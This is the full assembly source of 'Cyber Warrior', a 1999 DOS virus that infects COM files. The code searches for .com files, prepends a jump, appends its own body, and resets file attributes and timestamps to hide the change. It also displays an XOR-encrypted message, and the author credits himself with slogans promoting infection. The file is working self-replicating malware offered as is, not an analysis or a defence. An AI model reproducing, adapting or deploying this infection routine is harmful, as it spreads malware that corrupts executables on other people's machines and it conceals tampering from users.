;****************************************************************************
;*                              Virus Information                           *
;*##########################################################################*
;*                                                                          *
;*        Origin: Germany                      Source: The BugHunter        *
;*        Crate Date: 03.07.1999               Version: 1.00                *
;*        Last Modification Date: 03.07.1999                                *
;*                                                                          *
;*              Turbo Assembler Version 4.0    : tasm virus                 *
;*              Turbo Link Version 3.01        : tlink virus                *
;*                                                                          *
;*##########################################################################*
;*                           Modification History                           *
;*==========================================================================*
;*     v1.0    1. Create the Virus Body                                     *
;*             2. Add Payload                                               *
;*             3. Add Encryption for Payload                                *
;* 03/07/1999  4. Add COM-Infection                                         *
;*             5. Add ReSet File Attributes                                 *
;*             6. Add ReSet File Date/Time                                  *
;*             7. Virus Size: 818 Bytes                                     *
;****************************************************************************
;
; TSR..................... No
; Encrypted............... Yes (But Just PayLoad)
; Appending Virus......... Yes
; Com infector............ Yes
; Exe infector............ No(t yet)
; Ovl infector............ No
; Sys infector............ No
; Pe infector............. No
; Boot infector........... No
; ReSet Attrib............ Yes (Of Course)
; ReSet Time/Date......... Yes (Of Course)
; Avoid Heuristic......... No
; Disable Watchdogs....... No
; Targets Checksums....... No
; Payload................. No
; Message................. Yes
; Error trapping.......... No
; Directory Stealth....... No
; Full Stealth............ No
; Memory Stealth.......... No
; Size Stealth............ No
;
;Bugs:
;-don't know any bugs   ;)
;

display ''
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display 'л                          Cyber Warrior Ver 1.00                          л'
display 'л                          (C) 1999 The BugHunter                      :-) л'
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display ''
display 'Keep The Infectios Alive!!!!!'
display ''

title  Cyber Warrior
subttl (C) 1999 The BugHunter
subttl Latest revision: 03.07.1999

jumps

.radix 16
code segment
assume cs:code, ds:code, es:code

ID=0cdabh
org 100h

jump_to_virus:
        db      0e9h
        dw      virus-jump_to_virus-3
        dw      ID                                      ;ID    ;)

virus:
        call    delta_offset

delta_offset:
        pop     bp
        sub     bp, OFFSET delta_offset

restore_com:
        mov     di, 100h
        lea     si, [bp+ orgbytes]
        mov     cx, 05h
        rep     movsb

find_first_com:
        mov     ah, 1ah
        lea     dx, [bp+ dta]
        int     21h

        mov     ah, 4eh
        lea     dx, [bp+ commask]
        mov     cl, 07h

find_file:
        int     21h

        jc      no_files_found

delete_attributes:
        mov     ax, 4301h
        xor     cl, cl
        lea     dx, [bp+ dta+ 1eh]
        int     21h

set_pointer_to_file:
        mov     ax, 3d02h
        lea     dx, [bp+ dta+ 1eh]
        int     21h

        xchg    bx, ax

get_first_five_bytes:
        mov     ah, 3fh
        mov     cx, 05h
        lea     dx, [bp+ orgbytes]
        int     21h

infect_com:
is_it_an_exe_file:
        cmp     2 ptr [bp+ orgbytes], 'MZ'
        je      close_file
        cmp     2 ptr [bp+ orgbytes], 'ZM'
        je      close_file
        cmp     2 ptr [bp+ orgbytes+ 03h], ID
        je      close_file

calculate_jump:
        mov     ax, 2 ptr [bp+ dta+ 1ah]
        sub     ax, 03h
        mov     2 ptr [bp+ virbytes+ 01h],ax

write_new_bytes_to_com:
        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 40h
        lea     dx, [bp+ virbytes]
        mov     cx, 05h
        int     21h

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 40h
        mov     cx, temp_data-virus
        lea     dx, [bp+ virus]
        int     21h

restore_file_date&time:
        mov     ax, 5701h
        mov     cx, 2 ptr [bp+ dta+ 16h]
        mov     dx, 2 ptr [bp+ dta+ 18h]
        int     21h

restore_attributes:
        mov     ax, 4301h
        mov     cl, 1 ptr [bp+ dta+ 15h]
        lea     dx, [bp+ dta+ 1eh]
        int     21h

close_file:
        mov     ah, 3eh
        int     21h

find_next_file:
        mov     ah, 4fh
        jmp     find_file

no_files_found:

pay_load:
        mov     dx, 80h
        mov     ah, 1ah
        int     21h

        lea     si, [bp+ msg]
        mov     cx, whoami-msg

xor_loop:
        xor     1 ptr ds:[si], 'V'
        inc     si
        loop    xor_loop

        mov     ah, 09h
        lea     dx, [bp+ msg]
        int     21h

back_to_com:
        mov     si, 100h
        jmp     si

virusdata:
orgbytes db     0cdh, 020h, 0, 0, 0
virbytes db     0e9h, 000h, 0, 0abh, 0cdh
commask  db     '*.com',0

pay_load_data:
msg     db      5Bh, 5Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 5Bh, 5Ch, 7Ch, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 00h, 3Fh, 24h, 23h, 25h, 76h, 1Fh, 38h
        db      30h, 39h, 24h, 3Bh, 37h, 22h, 3Fh, 39h, 38h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 7Ch, 5Bh, 5Ch, 7Ch, 75h, 75h, 75h, 75h
        db      75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h
        db      75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h
        db      75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h
        db      75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h
        db      75h, 75h, 75h, 75h, 75h, 75h, 75h, 75h, 7Ch, 5Bh, 5Ch, 7Ch, 76h
        db      19h, 24h, 3Fh, 31h, 3Fh, 38h, 6Ch, 76h, 11h, 33h, 24h, 3Bh
        db      37h, 38h, 2Fh, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 05h, 39h, 23h, 24h, 35h, 33h, 6Ch, 76h, 02h, 3Eh, 33h
        db      76h, 14h, 23h, 31h, 1Eh, 23h, 38h, 22h, 33h, 24h, 76h, 7Ch
        db      5Bh, 5Ch, 7Ch, 76h, 15h, 24h, 37h, 22h, 33h, 76h, 12h, 37h, 22h
        db      33h, 6Ch, 76h, 66h, 65h, 78h, 66h, 61h, 78h, 67h, 6Fh, 6Fh
        db      6Fh, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 00h, 33h, 24h, 25h, 3Fh, 39h, 38h, 6Ch
        db      76h, 67h, 78h, 66h, 66h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 7Ch, 5Bh, 5Ch, 7Ch, 76h, 1Ah, 37h, 25h, 22h, 76h, 1Bh
        db      39h, 32h, 3Fh, 30h, 3Fh, 35h, 37h, 22h, 3Fh, 39h, 38h, 76h
        db      12h, 37h, 22h, 33h, 6Ch, 76h, 66h, 65h, 78h, 66h, 61h, 78h
        db      67h, 6Fh, 6Fh, 6Fh, 76h, 76h, 76h, 18h, 37h, 3Bh, 33h, 6Ch
        db      76h, 15h, 2Fh, 34h, 33h, 24h, 76h, 01h, 37h, 24h, 24h, 3Fh
        db      39h, 24h, 76h, 76h, 76h, 7Ch, 5Bh, 5Ch, 7Ch, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 01h, 33h, 76h, 37h, 24h, 33h, 76h
        db      39h, 23h, 22h, 22h, 37h, 76h, 3Eh, 33h, 24h, 33h, 77h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h
        db      76h, 76h, 76h, 76h, 76h, 76h, 76h, 76h, 7Ch, 5Bh, 5Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch, 7Ch
        db      5Bh, 5Ch, 72h

whoami  db      '{CybErWArriOr}[ThEBuGHuNtEr]'
whatsmygoal db  'Keep the Infections alive!'

temp_data:
        db      0dh, 0ah, 'Just Temp Data:', 0dh, 0ah
dummy   db      0
dummy2  db      0
dummy3  dw      0
dta     db      42h dup (?)
buffer  db      1ah dup (?)
text    db      0dh, 0ah, 'Just for fun ;)', 0dh, 0ah
        db      'My first virus written without any tutorials and without copy and paste   ;)', 0dh, 0ah
        db      'Keep The Infections Alive!!!!!'
eof     db      '---===EOF===---'

the_end:

code ends
end jump_to_virus
end
